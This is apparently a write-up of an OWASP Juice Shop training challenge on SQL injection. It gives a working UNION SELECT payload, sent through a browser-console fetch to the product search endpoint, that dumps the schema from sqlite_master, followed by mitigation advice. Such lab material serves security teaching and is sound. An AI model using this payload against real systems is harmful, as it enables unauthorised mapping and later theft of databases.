# Database Schema

## Category
Injection — Difficulty: ⭐⭐⭐

## Description

Exfiltrate the entire DB schema definition via SQL Injection.

## Vulnerability

The product search endpoint is vulnerable to SQL Injection. By injecting a UNION SELECT statement, an attacker can retrieve the entire database schema from the sqlite_master table.

## Steps

1. Open the browser console on the Juice Shop homepage
2. Send the following request with the SQL Injection payload:

```javascript
fetch('/rest/products/search?q=\'))UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--').then(r=>r.json()).then(console.log)
```

3. The response contains the full database schema including all table definitions.

## Impact

An attacker can map the entire database structure, which can be used to plan further attacks such as data exfiltration or privilege escalation.

## Mitigation

- Use parameterized queries or prepared statements
- Never concatenate user input directly into SQL queries
- Implement input validation and sanitization
